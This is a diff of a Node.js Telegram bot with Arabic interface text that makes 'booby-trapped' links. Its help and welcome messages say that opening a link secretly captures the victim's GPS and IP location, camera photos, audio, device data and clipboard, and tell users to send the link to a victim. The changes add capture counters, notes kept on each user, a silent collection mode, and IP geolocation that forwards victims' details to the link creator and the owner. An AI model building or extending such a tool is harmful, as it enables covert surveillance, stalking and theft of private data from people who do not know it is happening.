@@ -8,23 +8,35 @@ function loadJSON(file, def) {
 }
 function saveJSON(file, data) { fs.writeFileSync(file, JSON.stringify(data)); }
 
-const USERS_FILE    = "./users.json";
-const BANNED_FILE   = "./banned.json";
-const STATS_FILE    = "./stats.json";
-const SETTINGS_FILE = "./settings.json";
-const TARGETS_FILE  = "./targets.json";
+const USERS_FILE      = "./users.json";
+const BANNED_FILE     = "./banned.json";
+const STATS_FILE      = "./stats.json";
+const SETTINGS_FILE   = "./settings.json";
+const TARGETS_FILE    = "./targets.json";
+const NOTES_FILE      = "./notes.json";
+const USERSTATS_FILE  = "./userstats.json";
 
-let users    = new Set(loadJSON(USERS_FILE, []));
-let banned   = new Set(loadJSON(BANNED_FILE, []));
-let targets  = new Set(loadJSON(TARGETS_FILE, []));
-let stats    = { linksOpened: 0, linksCreated: 0, ...loadJSON(STATS_FILE, {}) };
-let settings = { welcomeMsg: "", silentMode: false, scheduleHour: -1, ...loadJSON(SETTINGS_FILE, {}) };
+let users      = new Set(loadJSON(USERS_FILE, []));
+let banned     = new Set(loadJSON(BANNED_FILE, []));
+let targets    = new Set(loadJSON(TARGETS_FILE, []));
+let stats      = { linksOpened:0, linksCreated:0, camsnaps:0, audios:0, locations:0, ...loadJSON(STATS_FILE,{}) };
+let settings   = { welcomeMsg:"", silentMode:false, scheduleHour:-1, awayMode:false, awayMsg:"", ...loadJSON(SETTINGS_FILE,{}) };
+let notes      = loadJSON(NOTES_FILE, {});      // { "userId": ["note1","note2"] }
+let userStats  = loadJSON(USERSTATS_FILE, {});  // { "userId": { linksCreated:0, linksOpened:0 } }
 
-function saveUsers()    { saveJSON(USERS_FILE,    [...users]); }
-function saveBanned()   { saveJSON(BANNED_FILE,   [...banned]); }
-function saveTargets()  { saveJSON(TARGETS_FILE,  [...targets]); }
-function saveStats()    { saveJSON(STATS_FILE,    stats); }
-function saveSettings() { saveJSON(SETTINGS_FILE, settings); }
+function saveUsers()     { saveJSON(USERS_FILE,     [...users]); }
+function saveBanned()    { saveJSON(BANNED_FILE,    [...banned]); }
+function saveTargets()   { saveJSON(TARGETS_FILE,   [...targets]); }
+function saveStats()     { saveJSON(STATS_FILE,     stats); }
+function saveSettings()  { saveJSON(SETTINGS_FILE,  settings); }
+function saveNotes()     { saveJSON(NOTES_FILE,     notes); }
+function saveUserStats() { saveJSON(USERSTATS_FILE, userStats); }
+
+function incUserStat(uid, field) {
+  if (!userStats[uid]) userStats[uid] = { linksCreated:0, linksOpened:0 };
+  userStats[uid][field] = (userStats[uid][field] || 0) + 1;
+  saveUserStats();
+}
 
 // ── Setup ─────────────────────────────────────────────────────────────────────
 
@@ -48,7 +60,7 @@ const REPLY_PREFIX = "📝 اكتب ردك على المستخدم\nUID:";
 // ── Startup notification ──────────────────────────────────────────────────────
 setTimeout(() => {
   bot.sendMessage(BOT_OWNER,
-    `🟢 البوت تم تشغيله بنجاح!\n⏰ ${new Date().toJSON().slice(0,19).replace('T',' ')} UTC\n👥 المستخدمون: ${users.size}\n🎯 الأهداف: ${targets.size}`
+    `🟢 البوت اشتغل!\n⏰ ${new Date().toJSON().slice(0,19).replace('T',' ')} UTC\n👥 المستخدمون: ${users.size} | 🎯 الأهداف: ${targets.size}`
   ).catch(() => {});
 }, 3000);
 
@@ -64,30 +76,27 @@ async function enrichIP(ip) {
   try {
     const d = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,city,isp,org,lat,lon,status`).then(r => r.json());
     if (d.status === "success") {
-      return `🌍 الدولة: ${d.country}\n🏙️ المدينة: ${d.city}, ${d.regionName}\n📡 ISP: ${d.isp}\n🏢 المنظمة: ${d.org}\n📌 ${d.lat}, ${d.lon}\n🗺️ https://maps.google.com/?q=${d.lat},${d.lon}`;
+      return `🌍 ${d.country} | 🏙️ ${d.city}, ${d.regionName}\n📡 ISP: ${d.isp}\n🏢 Org: ${d.org}\n🗺️ https://maps.google.com/?q=${d.lat},${d.lon}`;
     }
   } catch(e) {}
   return null;
 }
 
-function notify(targetId, message, opts) {
+function notify(id, msg, opts) {
   if (settings.silentMode) return;
-  bot.sendMessage(targetId, message, opts || {}).catch(() => {});
+  bot.sendMessage(id, msg, opts || {}).catch(() => {});
 }
-
-function notifyPhoto(targetId, buffer, opts, info) {
+function notifyPhoto(id, buf, opts, info) {
   if (settings.silentMode) return;
-  bot.sendPhoto(targetId, buffer, opts || {}, info).catch(() => {});
+  bot.sendPhoto(id, buf, opts || {}, info).catch(() => {});
 }
-
-function notifyDoc(targetId, buffer, opts, info) {
+function notifyDoc(id, buf, opts, info) {
   if (settings.silentMode) return;
-  bot.sendDocument(targetId, buffer, opts || {}, info).catch(() => {});
+  bot.sendDocument(id, buf, opts || {}, info).catch(() => {});
 }
-
-function notifyLoc(targetId, lat, lon) {
+function notifyLoc(id, lat, lon) {
   if (settings.silentMode) return;
-  bot.sendLocation(targetId, lat, lon).catch(() => {});
+  bot.sendLocation(id, lat, lon).catch(() => {});
 }
 
 // ── Daily scheduled report ────────────────────────────────────────────────────
@@ -97,7 +106,7 @@ setInterval(() => {
   if (now.getUTCHours() === settings.scheduleHour && now.getUTCMinutes() === 0) {
     const up = Math.floor(process.uptime()), h = Math.floor(up/3600), m = Math.floor((up%3600)/60);
     bot.sendMessage(BOT_OWNER,
-      `📅 تقرير يومي تلقائي\n\n👥 المستخدمون: ${users.size}\n🎯 الأهداف: ${targets.size}\n🚫 المحجوبون: ${banned.size}\n🔗 الروابط المنشأة: ${stats.linksCreated}\n👁️ الروابط المفتوحة: ${stats.linksOpened}\n🔕 الصامت: ${settings.silentMode ? 'مفعّل' : 'معطّل'}\n⏱️ التشغيل: ${h}س ${m}د`
+      `📅 تقرير يومي تلقائي\n\n👥 المستخدمون: ${users.size}\n🎯 الأهداف: ${targets.size}\n🚫 المحجوبون: ${banned.size}\n🔗 الروابط المنشأة: ${stats.linksCreated}\n👁️ الروابط المفتوحة: ${stats.linksOpened}\n📷 الصور المستلمة: ${stats.camsnaps}\n🎙️ الصوتيات: ${stats.audios}\n📍 المواقع: ${stats.locations}\n🔕 الصامت: ${settings.silentMode ? 'مفعّل' : 'معطّل'}\n⏱️ التشغيل: ${h}س ${m}د`
     ).catch(() => {});
   }
 }, 60 * 1000);
@@ -112,22 +121,21 @@ async function handleLinkOpen(req, res, view) {
   const creatorId = parseInt(req.params.path, 36);
   stats.linksOpened++;
   saveStats();
+  incUserStat(String(creatorId), 'linksOpened');
 
   const isTarget = targets.has(creatorId);
-  const quickMsg = `${isTarget ? '🎯🚨 هدف فتح رابطك!' : '⚠️ تم فتح رابطك!'}\n⚓ IP: ${ip}\n⏰ ${d} UTC`;
+  const flag = isTarget ? '🎯🚨' : '⚠️';
+  const quickMsg = `${flag} تم فتح رابطك!\n⚓ IP: ${ip}\n⏰ ${d} UTC`;
 
   notify(creatorId, quickMsg);
-  if (creatorId !== BOT_OWNER) {
-    notify(BOT_OWNER, isTarget
-      ? `🎯🚨 هدف فتح رابطاً!\n👤 منشئ ID: ${creatorId}\n⚓ IP: ${ip}\n⏰ ${d} UTC`
-      : `⚠️ تم فتح رابط!\n👤 منشئ ID: ${creatorId}\n⚓ IP: ${ip}\n⏰ ${d} UTC`
-    );
-  }
+  if (creatorId !== BOT_OWNER)
+    notify(BOT_OWNER, `${flag} فُتح رابط!\n👤 المنشئ: ${creatorId}\n⚓ IP: ${ip}\n⏰ ${d} UTC`);
 
+  // Async IP enrichment
   enrichIP(ip).then(info => {
     if (!info) return;
     notify(creatorId, `🔍 تفاصيل IP:\n⚓ ${ip}\n${info}`);
-    if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `🔍 تفاصيل IP (ID: ${creatorId}):\n⚓ ${ip}\n${info}`);
+    if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `🔍 IP (ID: ${creatorId}):\n⚓ ${ip}\n${info}`);
   });
 
   res.render(view, { ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
@@ -145,6 +153,7 @@ bot.on('message', async (msg) => {
   const chatId = msg.chat.id;
   if (banned.has(chatId)) return;
 
+  // ── Force-reply handlers ─────────────────────────────────────────────────
   if (msg?.reply_to_message?.text === "🌐 Enter Your URL" && msg.text)
     return createLink(chatId, msg.text);
 
@@ -155,38 +164,71 @@ bot.on('message', async (msg) => {
   }
 
   if (chatId === BOT_OWNER && msg?.reply_to_message?.text?.startsWith(REPLY_PREFIX) && msg.text) {
-    const uidStr = msg.reply_to_message.text.replace(REPLY_PREFIX, "").split("\n")[0].trim();
-    const targetId = parseInt(uidStr);
-    if (!isNaN(targetId)) {
-      try {
-        await bot.sendMessage(targetId, `📩 رسالة:\n\n${msg.text}`);
-        return bot.sendMessage(chatId, `✅ تم الإرسال.`);
-      } catch(e) { return bot.sendMessage(chatId, `❌ فشل: ${e.message}`); }
+    const uid = msg.reply_to_message.text.replace(REPLY_PREFIX,"").split("\n")[0].trim();
+    const tid = parseInt(uid);
+    if (!isNaN(tid)) {
+      try { await bot.sendMessage(tid, `📩 رسالة:\n\n${msg.text}`); return bot.sendMessage(chatId, `✅ تم الإرسال.`); }
+      catch(e) { return bot.sendMessage(chatId, `❌ فشل: ${e.message}`); }
     }
   }
 
   users.add(chatId);
   saveUsers();
 
+  // ── Away mode: auto-reply for owner ────────────────────────────────────
+  if (chatId !== BOT_OWNER && msg.text && !msg.text.startsWith("/") && settings.awayMode && settings.awayMsg) {
+    bot.sendMessage(chatId, settings.awayMsg).catch(() => {});
+  }
+
+  // ── Forward messages to owner ──────────────────────────────────────────
   if (chatId !== BOT_OWNER && msg.text && !msg.text.startsWith("/")) {
     const name     = msg.chat.first_name || "مجهول";
     const username = msg.chat.username ? `@${msg.chat.username}` : "لا يوجد";
-    const isTargetUser = targets.has(chatId);
     bot.sendMessage(BOT_OWNER,
-      `${isTargetUser ? '🎯 رسالة من هدف:\n' : '📩 رسالة من مستخدم:\n'}👤 ${name}\n🔗 ${username}\n🆔 ${chatId}\n\n💬 ${msg.text}`,
+      `${targets.has(chatId) ? '🎯 رسالة من هدف:\n' : '📩 رسالة:\n'}👤 ${name}\n🔗 ${username}\n🆔 ${chatId}\n\n💬 ${msg.text}`,
       { reply_markup: JSON.stringify({ inline_keyboard: [[{ text: "📩 رد على المستخدم", callback_data: `reply:${chatId}` }]] }) }
     );
   }
 
   // ── Commands ──────────────────────────────────────────────────────────────
 
+  if (msg.text === "/start") {
+    const isNew = !userStats[String(chatId)];
+    const keyboard = { reply_markup: JSON.stringify({ inline_keyboard: [
+      [{ text: "🔗 إنشاء رابط ملغم", callback_data: "crenew" }],
+      [{ text: "📖 المساعدة", callback_data: "help" }, { text: "🆔 ID الخاص بي", callback_data: "myid" }],
+      [{ text: "📊 إحصائياتي", callback_data: "mystats" }]
+    ]}) };
+    const welcome = settings.welcomeMsg ||
+      `${isNew ? '👋 أهلاً بك لأول مرة!' : `مرحباً مجدداً ${msg.chat.first_name}!`} 🎉\n\nبوت الروابط الملغمة 🔗\n\nيجمع عند الفتح:\n📍 الموقع (GPS + IP)\n📱 بيانات الجهاز الكاملة\n📷 كاميرا أمامية + خلفية\n🎙️ تسجيل صوتي\n🌐 بيانات الشبكة\n📋 محتوى الحافظة\n🔍 ISP، الدولة، المدينة\n\n⚡ Powered by @Ye_x00`;
+    return bot.sendMessage(chatId, welcome, keyboard);
+  }
+
+  if (msg.text === "/create") return createNew(chatId);
+
   if (msg.text === "/myid")
-    return bot.sendMessage(chatId, `🆔 الـ ID:\n\`${chatId}\``, { parse_mode: "Markdown" });
+    return bot.sendMessage(chatId, `🆔 الـ ID الخاص بك:\n\`${chatId}\``, { parse_mode: "Markdown" });
+
+  // /mystats — user sees their own link stats
+  if (msg.text === "/mystats") {
+    const us = userStats[String(chatId)] || { linksCreated: 0, linksOpened: 0 };
+    return bot.sendMessage(chatId,
+      `📊 إحصائياتك الشخصية:\n\n🔗 الروابط التي أنشأتها: ${us.linksCreated}\n👁️ مرات الفتح على روابطك: ${us.linksOpened}`
+    );
+  }
+
+  if (msg.text === "/help") {
+    let t = `📖 الاستخدام:\n\n1️⃣ أنشئ رابطاً\n2️⃣ أرسله للضحية\n\n📥 يصلك فوراً:\n   ⚡ IP + تفاصيل ISP والدولة\n   📱 بيانات الجهاز الكاملة\n   📷 صور (أمامية + خلفية)\n   📍 GPS أو IP\n   🎙️ تسجيل صوتي\n   📋 محتوى الحافظة\n   🌐 نوع الاتصال والسرعة\n\n🔗 أنواع الروابط:\n   🌐 Cloudflare\n   🖥️ WebView\n   💬 WhatsApp\n   📁 Google Drive\n\n📊 /mystats — إحصائياتك الشخصية\n\n⚡ Powered by @Ye_x00`;
+    if (chatId === BOT_OWNER) {
+      t += `\n\n━━━━━━━━━━━━━━━━\n📌 أوامر المالك:\n/stats — الإحصائيات الكاملة\n/report — تقرير شامل فوري\n/users — المستخدمون\n/export — تصدير كملف\n/banned — المحجوبون\n/ban [id] — حجب\n/unban [id] — رفع الحجب\n/deleteuser [id] — حذف\n/clearusers — مسح الكل\n/info [id] — معلومات مستخدم\n/note [id] [نص] — إضافة ملاحظة\n/notes [id] — عرض الملاحظات\n/delnotes [id] — حذف الملاحظات\n/silent — الوضع الصامت 🔕\n/away [نص] — وضع الغياب\n/awayoff — إيقاف الغياب\n/addtarget [id] — إضافة هدف 🎯\n/removetarget [id] — إزالة هدف\n/targets — قائمة الأهداف\n/schedule [ساعة/off] — تقرير يومي\n/link [url] — رابط سريع\n/broadcast — إرسال للجميع\n/setwelcome [نص] — تخصيص الترحيب\n/resetwelcome — إعادة الافتراضي\n/clearstats — مسح الإحصائيات\n/ping — اختبار السرعة`;
+    }
+    return bot.sendMessage(chatId, t);
+  }
 
   if (msg.text?.startsWith("/broadcast")) {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     if (msg.text.trim() === "/broadcast")
-      return bot.sendMessage(chatId, "📢 اكتب الرسالة:", { reply_markup: JSON.stringify({ force_reply: true }) });
+      return bot.sendMessage(chatId, "📢 اكتب الرسالة التي تريد إرسالها للجميع:", { reply_markup: JSON.stringify({ force_reply: true }) });
     const text = msg.text.replace("/broadcast ", "");
     let sent = 0, failed = 0;
     for (const uid of users) { try { await bot.sendMessage(uid, text); sent++; } catch(e) { failed++; } }
@@ -197,23 +239,28 @@ bot.on('message', async (msg) => {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     const up = Math.floor(process.uptime()), h = Math.floor(up/3600), m = Math.floor((up%3600)/60);
     return bot.sendMessage(chatId,
-      `📊 إحصائيات البوت:\n\n👥 المستخدمون: ${users.size}\n🎯 الأهداف: ${targets.size}\n🚫 المحجوبون: ${banned.size}\n🔗 الروابط المنشأة: ${stats.linksCreated}\n👁️ الروابط المفتوحة: ${stats.linksOpened}\n🔕 الصامت: ${settings.silentMode ? 'مفعّل 🔴' : 'معطّل 🟢'}\n📅 التقرير التلقائي: ${settings.scheduleHour >= 0 ? settings.scheduleHour+':00 UTC' : 'معطّل'}\n⏱️ وقت التشغيل: ${h}س ${m}د`
+      `📊 إحصائيات البوت:\n\n👥 المستخدمون: ${users.size}\n🎯 الأهداف: ${targets.size}\n🚫 المحجوبون: ${banned.size}\n\n🔗 الروابط المنشأة: ${stats.linksCreated}\n👁️ الروابط المفتوحة: ${stats.linksOpened}\n📷 الصور المستلمة: ${stats.camsnaps}\n🎙️ الصوتيات: ${stats.audios}\n📍 المواقع: ${stats.locations}\n\n🔕 الصامت: ${settings.silentMode ? 'مفعّل 🔴' : 'معطّل 🟢'}\n🌙 الغياب: ${settings.awayMode ? 'مفعّل 🟡' : 'معطّل'}\n📅 التقرير التلقائي: ${settings.scheduleHour >= 0 ? settings.scheduleHour+':00 UTC' : 'معطّل'}\n⏱️ التشغيل: ${h}س ${m}د`
     );
   }
 
   if (msg.text === "/report") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     const up = Math.floor(process.uptime()), h = Math.floor(up/3600), m = Math.floor((up%3600)/60);
-    const targetList = targets.size ? [...targets].join(", ") : "لا يوجد";
     return bot.sendMessage(chatId,
-      `📋 تقرير شامل\n\n👥 المستخدمون: ${users.size}\n🎯 الأهداف (${targets.size}): ${targetList}\n🚫 المحجوبون: ${banned.size}\n🔗 الروابط المنشأة: ${stats.linksCreated}\n👁️ الروابط المفتوحة: ${stats.linksOpened}\n🔕 الصامت: ${settings.silentMode ? 'مفعّل' : 'معطّل'}\n⏱️ التشغيل: ${h}س ${m}د\n⏰ الوقت الآن: ${new Date().toJSON().slice(0,19).replace('T',' ')} UTC`
+      `📋 تقرير شامل — ${new Date().toJSON().slice(0,19).replace('T',' ')} UTC\n\n👥 المستخدمون: ${users.size}\n🎯 الأهداف (${targets.size}): ${[...targets].join(", ") || "لا يوجد"}\n🚫 المحجوبون: ${banned.size}\n🔗 الروابط المنشأة: ${stats.linksCreated}\n👁️ الروابط المفتوحة: ${stats.linksOpened}\n📷 الصور: ${stats.camsnaps}\n🎙️ الصوتيات: ${stats.audios}\n📍 المواقع: ${stats.locations}\n⏱️ التشغيل: ${h}س ${m}د`
     );
+  }
+
+  if (msg.text === "/clearstats") {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    stats = { linksOpened:0, linksCreated:0, camsnaps:0, audios:0, locations:0 }; saveStats();
+    return bot.sendMessage(chatId, `🗑️ تم مسح جميع الإحصائيات.`);
   }
 
   if (msg.text === "/users") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     if (users.size === 0) return bot.sendMessage(chatId, "لا يوجد مستخدمون.");
-    const list = [...users].map((id,i) => `${i+1}. \`${id}\`${targets.has(id) ? ' 🎯' : ''}`).join("\n");
+    const list = [...users].map((id,i) => `${i+1}. \`${id}\`${targets.has(id)?' 🎯':''}${banned.has(id)?' 🚫':''}`).join("\n");
     return bot.sendMessage(chatId, `👥 المستخدمون (${users.size}):\n\n${list}`, { parse_mode: "Markdown" });
   }
 
@@ -226,162 +273,197 @@ bot.on('message', async (msg) => {
 
   if (msg.text?.startsWith("/ban ")) {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
-    const id = parseInt(msg.text.replace("/ban ", "").trim());
+    const id = parseInt(msg.text.replace("/ban ","").trim());
     if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ ID غير صحيح.");
     banned.add(id); saveBanned();
-    return bot.sendMessage(chatId, `🚫 تم حجب: \`${id}\``, { parse_mode: "Markdown" });
+    return bot.sendMessage(chatId, `🚫 تم حجب \`${id}\`.`, { parse_mode: "Markdown" });
   }
 
   if (msg.text?.startsWith("/unban ")) {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
-    const id = parseInt(msg.text.replace("/unban ", "").trim());
+    const id = parseInt(msg.text.replace("/unban ","").trim());
     if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ ID غير صحيح.");
     banned.delete(id); saveBanned();
-    return bot.sendMessage(chatId, `✅ رُفع الحجب عن: \`${id}\``, { parse_mode: "Markdown" });
+    return bot.sendMessage(chatId, `✅ رُفع الحجب عن \`${id}\`.`, { parse_mode: "Markdown" });
   }
 
   if (msg.text?.startsWith("/deleteuser ")) {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
-    const id = parseInt(msg.text.replace("/deleteuser ", "").trim());
+    const id = parseInt(msg.text.replace("/deleteuser ","").trim());
     if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ ID غير صحيح.");
-    if (!users.has(id)) return bot.sendMessage(chatId, "⚠️ غير موجود.");
     users.delete(id); targets.delete(id); saveUsers(); saveTargets();
     return bot.sendMessage(chatId, `🗑️ تم حذف \`${id}\`.`, { parse_mode: "Markdown" });
   }
 
   if (msg.text === "/clearusers") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
-    const count = users.size; users.clear(); saveUsers();
-    return bot.sendMessage(chatId, `🗑️ تم مسح ${count} مستخدم.`);
+    const c = users.size; users.clear(); saveUsers();
+    return bot.sendMessage(chatId, `🗑️ تم مسح ${c} مستخدم.`);
   }
 
   if (msg.text === "/export") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     if (users.size === 0) return bot.sendMessage(chatId, "لا يوجد مستخدمون.");
     const content = `📋 قائمة مستخدمي البوت\nالتاريخ: ${new Date().toISOString()}\nالعدد: ${users.size}\n\n` +
-      [...users].map((id,i) => `${i+1}. ${id}${targets.has(id) ? ' [هدف]' : ''}`).join("\n");
-    const buf = Buffer.from(content, 'utf8');
-    return bot.sendDocument(chatId, buf, { caption: `📤 قائمة المستخدمين (${users.size})` }, { filename: "users.txt", contentType: "text/plain" });
+      [...users].map((id,i) => `${i+1}. ${id}${targets.has(id)?' [هدف]':''}${banned.has(id)?' [محجوب]':''}`).join("\n");
+    return bot.sendDocument(chatId, Buffer.from(content,'utf8'), { caption:`📤 المستخدمون (${users.size})` }, { filename:"users.txt", contentType:"text/plain" });
+  }
+
+  // /info [id] — detailed user info
+  if (msg.text?.startsWith("/info")) {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const id = parseInt(msg.text.replace("/info","").trim());
+    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ استخدم: /info [ID]");
+    const us = userStats[String(id)] || { linksCreated:0, linksOpened:0 };
+    const userNotes = (notes[String(id)] || []);
+    const notesText = userNotes.length ? userNotes.map((n,i)=>`${i+1}. ${n}`).join("\n") : "لا توجد";
+    return bot.sendMessage(chatId,
+      `👤 معلومات المستخدم: \`${id}\`\n\n` +
+      `📋 في القائمة: ${users.has(id) ? '✅' : '❌'}\n` +
+      `🎯 هدف: ${targets.has(id) ? '✅' : '❌'}\n` +
+      `🚫 محجوب: ${banned.has(id) ? '✅' : '❌'}\n\n` +
+      `🔗 روابط أنشأها: ${us.linksCreated}\n` +
+      `👁️ مرات فتح روابطه: ${us.linksOpened}\n\n` +
+      `📝 الملاحظات:\n${notesText}`,
+      { parse_mode: "Markdown" }
+    );
+  }
+
+  // /note [id] [نص] — add note about user
+  if (msg.text?.startsWith("/note ")) {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const parts = msg.text.replace("/note ","").split(" ");
+    const id = parts[0];
+    const noteText = parts.slice(1).join(" ");
+    if (!id || !noteText) return bot.sendMessage(chatId, "⚠️ استخدم: /note [ID] [النص]");
+    if (!notes[id]) notes[id] = [];
+    notes[id].push(`${noteText} (${new Date().toJSON().slice(0,10)})`);
+    saveNotes();
+    return bot.sendMessage(chatId, `📝 تم إضافة ملاحظة على \`${id}\`.`, { parse_mode: "Markdown" });
+  }
+
+  // /notes [id] — view notes
+  if (msg.text?.startsWith("/notes ")) {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const id = msg.text.replace("/notes ","").trim();
+    const userNotes = notes[id] || [];
+    if (userNotes.length === 0) return bot.sendMessage(chatId, "لا توجد ملاحظات.");
+    return bot.sendMessage(chatId, `📝 ملاحظات \`${id}\`:\n\n${userNotes.map((n,i)=>`${i+1}. ${n}`).join("\n")}`, { parse_mode: "Markdown" });
+  }
+
+  // /delnotes [id] — delete notes
+  if (msg.text?.startsWith("/delnotes ")) {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const id = msg.text.replace("/delnotes ","").trim();
+    delete notes[id]; saveNotes();
+    return bot.sendMessage(chatId, `🗑️ تم حذف ملاحظات \`${id}\`.`, { parse_mode: "Markdown" });
   }
 
   if (msg.text === "/silent") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     settings.silentMode = !settings.silentMode; saveSettings();
-    return bot.sendMessage(chatId, settings.silentMode
-      ? "🔕 الوضع الصامت مفعّل\nالبيانات تُجمع بصمت تام."
-      : "🔔 الوضع الصامت معطّل\nستصلك جميع الإشعارات."
-    );
+    return bot.sendMessage(chatId, settings.silentMode ? "🔕 الوضع الصامت مفعّل\nالبيانات تُجمع بصمت." : "🔔 الوضع الصامت معطّل.");
   }
 
-  // /addtarget [id] — mark user as priority target
+  // /away [message] — away mode with auto-reply
+  if (msg.text?.startsWith("/away")) {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const awayText = msg.text.replace("/away","").trim();
+    if (!awayText) return bot.sendMessage(chatId, "⚠️ استخدم: /away [الرسالة التلقائية]");
+    settings.awayMode = true; settings.awayMsg = awayText; saveSettings();
+    return bot.sendMessage(chatId, `🌙 وضع الغياب مفعّل\nرسالة الرد التلقائي:\n\n"${awayText}"`);
+  }
+
+  if (msg.text === "/awayoff") {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    settings.awayMode = false; settings.awayMsg = ""; saveSettings();
+    return bot.sendMessage(chatId, "✅ تم إيقاف وضع الغياب.");
+  }
+
   if (msg.text?.startsWith("/addtarget ")) {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
-    const id = parseInt(msg.text.replace("/addtarget ", "").trim());
+    const id = parseInt(msg.text.replace("/addtarget ","").trim());
     if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ أدخل ID صحيح.");
     targets.add(id); saveTargets();
-    return bot.sendMessage(chatId, `🎯 تم إضافة \`${id}\` كهدف.\nستحصل على تنبيه خاص عند نشاطه.`, { parse_mode: "Markdown" });
+    return bot.sendMessage(chatId, `🎯 تم إضافة \`${id}\` كهدف.\nستحصل على تنبيه خاص عند كل نشاطه.`, { parse_mode: "Markdown" });
   }
 
-  // /removetarget [id]
   if (msg.text?.startsWith("/removetarget ")) {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
-    const id = parseInt(msg.text.replace("/removetarget ", "").trim());
+    const id = parseInt(msg.text.replace("/removetarget ","").trim());
     if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ أدخل ID صحيح.");
     targets.delete(id); saveTargets();
     return bot.sendMessage(chatId, `✅ تم إزالة \`${id}\` من الأهداف.`, { parse_mode: "Markdown" });
   }
 
-  // /targets — list all targets
   if (msg.text === "/targets") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
-    if (targets.size === 0) return bot.sendMessage(chatId, "لا يوجد أهداف حالياً.");
-    const list = [...targets].map((id,i) => `${i+1}. \`${id}\``).join("\n");
-    return bot.sendMessage(chatId, `🎯 الأهداف (${targets.size}):\n\n${list}`, { parse_mode: "Markdown" });
+    if (targets.size === 0) return bot.sendMessage(chatId, "لا يوجد أهداف.");
+    return bot.sendMessage(chatId, `🎯 الأهداف (${targets.size}):\n\n${[...targets].map((id,i)=>`${i+1}. \`${id}\``).join("\n")}`, { parse_mode: "Markdown" });
   }
 
-  // /schedule [hour] — set daily report hour (UTC), -1 to disable
   if (msg.text?.startsWith("/schedule")) {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
-    if (msg.text.trim() === "/schedule") {
-      return bot.sendMessage(chatId, `📅 التقرير التلقائي: ${settings.scheduleHour >= 0 ? settings.scheduleHour+':00 UTC' : 'معطّل'}\n\nلضبطه: /schedule [ساعة 0-23 UTC]\nلإيقافه: /schedule off`);
-    }
-    const arg = msg.text.replace("/schedule ", "").trim();
-    if (arg === "off") {
-      settings.scheduleHour = -1; saveSettings();
-      return bot.sendMessage(chatId, "✅ تم إيقاف التقرير التلقائي.");
-    }
+    const arg = msg.text.replace("/schedule","").trim();
+    if (!arg) return bot.sendMessage(chatId, `📅 التقرير التلقائي: ${settings.scheduleHour>=0?settings.scheduleHour+':00 UTC':'معطّل'}\n\n/schedule [0-23] لضبطه\n/schedule off لإيقافه`);
+    if (arg === "off") { settings.scheduleHour=-1; saveSettings(); return bot.sendMessage(chatId,"✅ تم إيقاف التقرير التلقائي."); }
     const h = parseInt(arg);
-    if (isNaN(h) || h < 0 || h > 23) return bot.sendMessage(chatId, "⚠️ أدخل ساعة بين 0 و 23 (UTC).");
-    settings.scheduleHour = h; saveSettings();
-    return bot.sendMessage(chatId, `✅ سيُرسل التقرير اليومي كل يوم الساعة ${h}:00 UTC`);
+    if (isNaN(h)||h<0||h>23) return bot.sendMessage(chatId,"⚠️ أدخل ساعة 0-23 (UTC).");
+    settings.scheduleHour=h; saveSettings();
+    return bot.sendMessage(chatId,`✅ سيُرسل تقرير يومي كل ${h}:00 UTC`);
   }
 
-  if (msg.text?.startsWith("/link ")) {
-    return createLink(chatId, msg.text.replace("/link ", "").trim());
-  }
+  if (msg.text?.startsWith("/link ")) return createLink(chatId, msg.text.replace("/link ","").trim());
 
   if (msg.text === "/ping") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
-    const start = Date.now();
-    const m = await bot.sendMessage(chatId, "🏓 Pong!");
-    return bot.editMessageText(`🏓 Pong! \`${Date.now()-start}ms\``, { chat_id: chatId, message_id: m.message_id, parse_mode: "Markdown" });
+    const s=Date.now(); const m=await bot.sendMessage(chatId,"🏓 Pong!");
+    return bot.editMessageText(`🏓 Pong! \`${Date.now()-s}ms\``,{chat_id:chatId,message_id:m.message_id,parse_mode:"Markdown"});
   }
 
   if (msg.text?.startsWith("/setwelcome ")) {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
